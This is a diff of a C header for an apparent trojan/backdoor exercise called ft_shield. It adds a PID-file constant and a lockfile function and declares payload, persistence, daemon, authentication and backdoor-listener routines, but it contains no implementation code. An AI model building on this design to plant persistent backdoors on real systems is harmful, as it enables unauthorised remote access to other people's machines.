@@ -32,6 +32,7 @@
 # define MAX_CLIENTS 3
 # define PACKET_SIZE 64
 # define BUFFER 1024
+# define PID_FILE    "/var/run/ft_shield.pid"
 
 typedef struct s_troyan
 {
@@ -71,10 +72,11 @@ int         ft_payload(t_troyan *shield);
 int         ft_persistence(t_troyan *shield);
 int         init_servsocket(t_troyan *shield);
 int         loop_server(t_troyan *shield);
-void        ft_connection(t_troyan *shield, int socket_client);
+void        ft_connection(int socket_client);
 void        init_signal();
 void        sigalrm_handler(int signum);
 void        sigint_handler(int signum);
+int	        ft_lockfile(void);
 int         ft_create_daemon(t_troyan *shield);
 int         ft_auth(int client_fd);
 int         wait_backdoor();
